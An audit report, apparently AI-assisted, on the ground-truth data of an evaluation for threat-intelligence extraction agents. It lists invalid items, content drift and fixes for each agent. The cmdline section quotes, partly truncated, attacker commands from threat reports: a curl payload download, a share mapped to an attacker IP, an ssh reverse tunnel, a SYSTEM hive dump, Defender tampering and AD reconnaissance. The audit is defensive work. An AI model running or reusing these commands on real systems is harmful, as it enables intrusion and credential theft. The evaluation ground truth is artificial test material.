# Extraction Eval Ground Truth Audit -- Europa 7.0.1

**Date:** 2026-05-15
**Branch:** dev-Europa-7.0.1
**Auditor:** Claude (assisted)
**Scope:** All 6 extraction sub-agents, all entries in `config/eval_articles_data/*/ground_truth.json`

---

## Executive Summary

Audit of 52 ground truth entries across 6 extraction agents revealed:

- **registry_artifacts**: Clean -- all 25 items valid
- **cmdline**: 21 items reference content not present in stored articles (content drift)
- **hunt_queries**: 15 of 27 items are narrative prose or rule titles, not executable queries
- **process_lineage**: 3 formatting violations (malware names in item text), 1 contract violation (DLL sideloading is not process creation)
- **windows_services**: 9 of 11 items fail Gate 2 or scope rules
- **scheduled_tasks**: 4 of 6 items are detection rule names or registry paths, not task identities

**Changes already applied in this session:**

| File | Change |
|------|--------|
| `process_lineage/ground_truth.json` | Added `wmiprvse.exe -> regsvr32.exe` for Egg-Cellent Resume |
| `scheduled_tasks/ground_truth.json` | Added `Update2` for Cobalt Strike/LockBit |
| `eval_articles.yaml` | Updated LockBit scheduled_tasks expected_count 0 -> 1 |
| `scheduled_tasks/articles.json` | Updated LockBit expected_count 0 -> 1 |

All sync tests pass after changes.

---

## Agent-by-Agent Findings

---

### 1. Registry Artifacts -- CLEAN (25/25 valid)

All 25 expected items across 9 articles are:

- Present in their respective article text
- Full hive-rooted registry paths (HKLM, HKCU, etc.)
- Extracted from observed attacker behavior or analysis narrative
- Not sourced from detection logic or source code

**Verdict: No changes needed.**

---

### 2. Cmdline -- 21 items missing from stored article text

72 of 93 items verified present. 21 items appear in ground_truth.json but do NOT exist in the stored article content (articles.json). Two additional items have backslash escaping mismatches.

This is likely **content drift** -- articles were re-fetched or junk-filtered after ground truths were written, and the new article snapshots no longer contain these command lines.

#### Missing items by article

**Proofpoint "Bitter End" (9 missing):**

| # | Expected Item (truncated) | Issue |
|---|--------------------------|-------|
| 1 | `"C:\Windows\System32\conhost.exe" --headless cmd /c ping localhost > nul & schtasks /create /tn "EdgeTaskUI"...` | Not in article text |
| 2 | `schtasks /create /tn "Task-S-1-5-42121" /f /sc minute /mo 18 /tr...` | Not in article text |
| 3 | `"C:\Windows\System32\cmd.exe" /start min /c schtasks /create /tn "OneDrive\OneDrive Standalone Update Task...` | Not in article text |
| 4 | `cd C:\programdata dir > abc1.pdf tasklist >> abc1.pdf wmic /namespace:\\root\SecurityCenter2...` | Not in article text |
| 5 | `cd C:\programdata set /P ="MZ" < nul >> sh1.txt curl -o sh2.txt...` | Not in article text |
| 6 | `cd C:\programdata net use Z: \\72.18.215[.]1\tempy Z: Z:\shl.exe dune64.bin C:...` | Not in article text |
| 7 | `"C:\Windows\System32\conhost.exe" --headless cmd /c ping localhost > nul & schtasks /create /tn "MSTaskUI"...` | Not in article text |
| 8 | `reg.exe save HKLM\SYSTEM "C:\Windows\temp\1\sy.sa" /y` | Not in article text |
| 9 | (1 additional item) | Not in article text |

**DFIR Report "OneNote to RansomNote" (8 missing):**

| # | Expected Item | Issue |
|---|--------------|-------|
| 1 | `adfind.exe -gcb -sc trustdmp` | Not in stored article |
| 2 | `adfind.exe -f "(objectcategory=group)"` | Not in stored article |
| 3 | `adfind.exe -subnets -f (objectCategory=subnet)` | Not in stored article |
| 4 | `adfind.exe -f (objectcategory=organizationalUnit)` | Not in stored article |
| 5 | `adfind.exe -f objectcategory=computer -csv name operatingSystem` | Not in stored article |
| 6 | `adfind.exe -f objectcategory=computer` | Not in stored article |
| 7 | `adfind.exe -f (objectcategory=person)` | Not in stored article |
| 8 | `rundll32.exe "C:\Users[REDACTED]\AppData\Roaming[REDACTED]\Cadiak.dll",init --od="DeskBlouse\license.dat"` | Not in stored article |

**LevelBlue "Screen Connect" (1 missing):**

- `mshta.exe (IWshShell3.Run("\"C:\Users\Mguise\ONEDRI~1\DOCUME~1\loadding\Temp\X-META~1.BAT\" ::", \"0\"))` -- not in stored article

**Akira/Bumblebee (1 missing):**

- `ssh root@193.242.184.150 -R *:10400 -p22` -- not in stored article

**Elastic "RoningLoader" (3 missing):**

- `mklink /D "C:\ProgramData\roming" C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25050.5-0`
- `C:\Windows\System32\ClipUp.exe -ppl C:\ProgramData\roming\MsMpEng.exe`
- `regsvr32.exe /S "C:\ProgramData\Roning\goldendays.dll"`

#### Escaping mismatches (2 items, Proofpoint article)

Ground truth has single backslashes; article text has double backslashes (`\\`):

- `tree "%userprofile%\Desktop" /f > C:\Users\Public\Documents\d.log...`
- `curl -o C:\ProgramData\msuitl.tar hxxp://utizviewstation[.]com/msuitl.tar...`

#### Recommended action

Re-fetch affected articles using `scripts/fetch_eval_articles_static.py` or manually verify which version of the article is canonical, then reconcile ground truths against the current stored snapshots.

---

### 3. Hunt Queries -- 15 of 27 items INVALID

11 of 27 items are valid executable queries (KQL, CQL, etc.) found verbatim in article text. 15 items violate the contract. 1 item has a near-match issue.

#### Valid items (11)

| Article | Item (truncated) | Type |
|---------|-----------------|------|
| Phishing/Spoofing (Microsoft) | `EmailEvents \| where Timestamp >= ago(30d)...` | KQL |
| CrowdStrike SharePoint 0-day | `correlate( cmd: { #event_simpleName=ProcessRollup2...` | CQL |
| ClickFix (Microsoft) | `DeviceRegistryEvents \| where ActionType =~ "RegistryValueSet"...` | KQL |
| ClickFix (Microsoft) | `DeviceProcessEvents \| where InitiatingProcessFileName == "powershell.exe"...` | KQL |
| Shai Hulud 2.0 (Microsoft) | `DeviceProcessEvents \| where FileName has "node"...` | KQL |
| Shai Hulud 2.0 (Microsoft) | `DeviceProcessEvents \| where InitiatingProcessFileName in~ ("node"...)...` | KQL |
| Shai Hulud 2.0 (Microsoft) | `DeviceProcessEvents \| where FileName has_any ("bash"...)...` | KQL |
| React2Shell (Microsoft) | `CloudAuditEvents \| where (ProcessCommandLine == "/bin/sh -c (whoami)"...` | KQL |
| React2Shell (Microsoft) | `DeviceProcessEvents \| where Timestamp >= ago(lookback)...InitiatingProcessParentFileName has "node"...` | KQL |
| React2Shell (Microsoft) | `DeviceProcessEvents \| where Timestamp >= ago(lookback)...InitiatingProcessFileName =~ "node.exe"...` | KQL |
| React2Shell (Microsoft) | `DeviceProcessEvents \| where Timestamp >= ago(lookback)...InitiatingProcessFileName == "node"...` | KQL |

#### Invalid items -- Narrative/prose descriptions (8)

These are technique descriptions, not executable detection logic. The contract requires "verbatim, copy-pasteable detection artifacts."

| Article | Invalid Item | Should Be |
|---------|-------------|-----------|
| CrowdStrike Cookie Spider | `Bash script execution with calls to risky LOOBINs` | Actual FQL/KQL query from article (or remove if none exists) |
| CrowdStrike Cookie Spider | `AppleScript execution under a binary from /tmp/` | Same |
| CrowdStrike Cookie Spider | `Curl with commandline indicative of data exfil` | Same |
| CISA BRICKSTORM | `BRICKSTORM Backdoor Activity r2` | Campaign label, not a query |
| DFIR Qbot/Zerologon | `Scheduled task executing powershell encoded payload from registry` | Prose description |
| DFIR Qbot/Zerologon | `Execution of ZeroLogon PoC executable` | Prose description |
| DFIR Qbot/Zerologon | `Enabling RDP service via reg.exe command execution` | Prose description |
| DFIR Follina | `Potential Qbot SMB DLL Lateral Movement` | Prose description |

#### Invalid items -- Sigma rule titles instead of full YAML (4)

Article contains actual Sigma YAML rules, but ground truth only has the title string.

| Article | Invalid Item |
|---------|-------------|
| Securelist macOS attacks | `Keychain access` |
| Securelist macOS attacks | `SIP status discovery` |
| Securelist macOS attacks | `Quarantine attribute removal` |
| Securelist macOS attacks | `Gatekeeper disable` |

#### Invalid items -- Rule filenames instead of YAML (2)

| Article | Invalid Item |
|---------|-------------|
| DFIR Follina | `proc_creation_win_msdt_susp_parent` |
| DFIR Follina | `proc_creation_win_sdiagnhost_susp_child` |

#### Invalid items -- Fragment only (1)

| Article | Invalid Item | Issue |
|---------|-------------|-------|
| Phishing/Spoofing (Microsoft) | `_Im_NetworkSession` | Bare table/function name with no query logic |

#### Near-match issue (1)

| Article | Item | Issue |
|---------|------|-------|
| Phishing/Spoofing (Microsoft) | Second EmailEvents query | Article has inline comments (`// No connector used`) breaking exact match |

#### Recommended action

- Replace narrative descriptions with actual executable queries from the articles, or remove if no executable query exists
- Replace Sigma rule titles with the full YAML blocks from the articles
- Replace rule filenames with full YAML or remove
- Remove bare table names without query logic

---

### 4. Process Lineage -- 3 formatting issues, 1 contract violation

6 populated entries across 5 articles. 3 valid as-is; 3 have issues plus 1 clear violation.

#### Valid items (3 + 1 newly added)

| Article | Item | Evidence |
|---------|------|----------|
| WSUS CVE (Picus) | `wsusservice.exe -> cmd.exe` | Arrow chain in article: "wsusservice.exe -> cmd.exe -> cmd.exe -> powershell.exe" |
| WSUS CVE (Picus) | `w3wp.exe -> cmd.exe` | Arrow chain in article: "w3wp.exe -> cmd.exe -> cmd.exe -> powershell.exe" |
| Egg-Cellent Resume (DFIR) | `wmiprvse.exe -> regsvr32.exe` | "The process wmiprvse.exe then **spawned** the following command: regsvr32" |
| Blurring the Lines (DFIR) | `EarthTime.exe -> cmd.exe` | "EarthTime.exe spawned cmd.exe with no command line arguments" |

#### Formatting violations -- malware names in parens (2)

Contract: "Product names, malware family names, tool brands, and generic labels are NOT valid process names. Both endpoints must be Windows image filenames."

| Article | Current Item | Suggested Fix |
|---------|-------------|---------------|
| OneNote to RansomNote (DFIR) | `rundll32 (IcedID) -> regsvr32 (Cobalt Strike DLL)` | `rundll32.exe -> regsvr32.exe` |
| Blurring the Lines (DFIR) | `MSBuild.exe -> ccs.exe (Betruger)` | `MSBuild.exe -> ccs.exe` |

#### Contract violation -- DLL sideloading is not process creation (1)

Contract: "Injection, hollowing, migration, impersonation, DLL loading, DLL sideloading, service registration, and scheduled-task creation are NOT process creation and are EXCLUDED."

| Article | Current Item | Action |
|---------|-------------|--------|
| Continuing Bazar Story (DFIR) | `REGSVR32 -> svchost.exe (DLL sideload injection chain)` | **Remove** -- the ground truth label itself acknowledges this is DLL sideloading |

#### Items needing verb verification (2)

These may be valid but the sub-agent flagged them. Need manual review of full article text:

| Article | Item | Question |
|---------|------|----------|
| OneNote to RansomNote (DFIR) | `OneNote.exe -> cmd.exe` | Is there an explicit creation verb linking these two? cmd.exe as **child** is allowed. |
| TeamCity APT29 (Fortinet) | `w3wp.exe -> schtasks.exe` | Is there an explicit verb? schtasks.exe as **child** is allowed (blanket exclusion is only for schtasks as parent). |

---

### 5. Windows Services -- 9 of 11 items problematic

Only 2 of 11 items clearly pass both Gate 1 (service indicator present) and Gate 2 (actionable artifact with service_name or binary_path).

#### Valid items (2)

| Article | Item | Evidence |
|---------|------|----------|
| Huntress Executive Targeting | `WebrootCheck` | "created a service titled WebrootCheck with a Service File Name of cmd.exe /c c:\temp\1.bat" |
| Zero to Domain Admin (DFIR) | `Reset-ComputerMachinePassword service (Zerologon, Event ID 7045)` | "a service (Event ID 7045) will be created that will run the Reset-ComputerMachinePassword PowerShell Cmdlet" |

#### Gate 2 failures -- no actionable service_name or binary_path (4)

| Article | Item | Issue |
|---------|------|-------|
| LockBit (DFIR) | `SystemBC` | Narrative mention of deployment via scheduled tasks, no service creation details |
| LockBit (DFIR) | `GhostSOCKS` | Same -- persistence via scheduled tasks and run keys, not services |
| LockBit (DFIR) | `Cobalt Strike psexec remote service` | Generic description; PsExec creates ephemeral services with autogenerated names, none specified |
| Qbot (DFIR) | `QBot DLL remote service (random name, DeleteFlag set)` | "Random name" is not reproducible; no explicit service_name stated |

#### Scope violation -- legitimate services being stopped, not attacker-created (4)

Contract scope is service **creation, modification, start, stop, and deletion** by attackers. However, these are legitimate Windows Defender services being disabled as defense evasion. The contract's negative scope says to skip "Defensive guidance or hardening recommendations."

| Article | Item | Issue |
|---------|------|-------|
| Cephalus (Huntress) | `SecurityHealthService` | Stop-Service on legitimate Windows service |
| Cephalus (Huntress) | `Sense` | Stop-Service on legitimate Windows service |
| Cephalus (Huntress) | `WinDefend` | Stop-Service on legitimate Windows service |
| Cephalus (Huntress) | `WdNisSvc` | Stop-Service on legitimate Windows service |

**Note:** This is a judgment call. The contract does include "stop" as a valid operation_type. Stopping Defender services is attacker-observed behavior with detection value (EID 7036, sc.exe commands). However, these are not attacker-**created** services. The contract sub-agent flagged these as "defensive guidance" but they could be considered valid stop/disable operations. **Needs human decision.**

#### Partial pass -- binary_path present but no service_name (1)

| Article | Item | Issue |
|---------|------|-------|
| Huntress Executive Targeting | `Mesh Agent (web.exe)` | Article says "a common service modified to run an executable" but never names the service. Binary path (C:\Users\Default\AppData\Local\Temp\web.exe) exists. Gate 2 says "at least one of service_name or binary_path" so this may pass on binary_path alone. **Needs human decision.** |

---

### 6. Scheduled Tasks -- 4 of 6 items INVALID

Only 2 of 6 items are actual task identities extracted from intrusion narratives.

#### Valid items (2)

| Article | Item | Evidence |
|---------|------|----------|
| Tarrask (Microsoft) | `WinUpdate` | "the threat actor created a scheduled task named 'WinUpdate'" |
| LockBit (DFIR) | `Update2` | `schtasks /create /ru SYSTEM /sc ONSTART /tn Update2` |

#### Contract violations -- registry path (1)

| Article | Item | Issue |
|---------|------|-------|
| Tarrask (Microsoft) | `\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\WinUpdate` | Contract: "Any store_path containing \Schedule\TaskCache\ is INVALID" -- this is a registry path, not a filesystem store_path. RegistryExtract owns it. |

#### Contract violations -- detection rule names, not task identities (3)

| Article | Item | Issue |
|---------|------|-------|
| Tarrask (Microsoft) | `Scheduled Task Hide` | Sentinel detection query name from the article's Detections section |
| Qbot (DFIR) | `QBot scheduled task REGSVR32 and C$ image path` | Sigma rule title from the article's Detections section |
| Zero to Domain Admin (DFIR) | `sysmon_cobaltstrike_service_installs` | Sigma rule name from the article's Detections section |

**Note on Qbot:** The valid task name `juqpxmakfk` IS present and correctly included. Only the second item (Sigma title) is invalid.

---

## Priority Actions

### P0 -- Clear contract violations (fix now)

1. **process_lineage**: Remove `REGSVR32 -> svchost.exe (DLL sideload injection chain)` -- DLL sideloading excluded by contract
2. **process_lineage**: Strip malware annotations: `rundll32 (IcedID) -> regsvr32 (Cobalt Strike DLL)` -> `rundll32.exe -> regsvr32.exe`
3. **process_lineage**: Strip malware annotations: `MSBuild.exe -> ccs.exe (Betruger)` -> `MSBuild.exe -> ccs.exe`
4. **scheduled_tasks**: Remove `\Microsoft\Windows NT\...\TaskCache\Tree\WinUpdate` (registry path)
5. **scheduled_tasks**: Remove `Scheduled Task Hide` (detection query name)
6. **scheduled_tasks**: Remove `QBot scheduled task REGSVR32 and C$ image path` (Sigma rule title)
7. **scheduled_tasks**: Remove `sysmon_cobaltstrike_service_installs` (Sigma rule name)

### P1 -- Needs human judgment

8. **windows_services (Cephalus)**: Are Stop-Service operations on Defender services valid ground truth? They are attacker behavior but not attacker-created services.
9. **windows_services (LockBit)**: SystemBC/GhostSOCKS/psexec remote service -- narrative-only with no specific service_name. Keep or remove?
10. **windows_services (Qbot)**: "Random name" service -- keep as generic or remove?
11. **windows_services (Huntress)**: Mesh Agent with binary_path but no service_name -- valid?
12. **process_lineage**: Verify `OneNote.exe -> cmd.exe` and `w3wp.exe -> schtasks.exe` have explicit creation verbs in article text

### P2 -- Hunt queries overhaul

13. Replace 8 narrative-description items with actual executable queries or remove
14. Replace 4 Sigma rule titles with full YAML blocks
15. Replace 2 Sigma rule filenames with full YAML or remove
16. Remove bare `_Im_NetworkSession` table name

### P3 -- Cmdline content drift

17. Re-fetch affected articles and reconcile 21 missing items + 2 escaping mismatches

---

## Appendix: Expected Count Sync

After the two additions made in this session, all `eval_articles.yaml` expected_counts match `ground_truth.json` item counts. Sync test (`tests/quality/test_eval_articles_sync.py`) passes 3/3.

Any removals from P0 actions above will require decrementing the corresponding expected_counts in both `eval_articles.yaml` and `articles.json`.
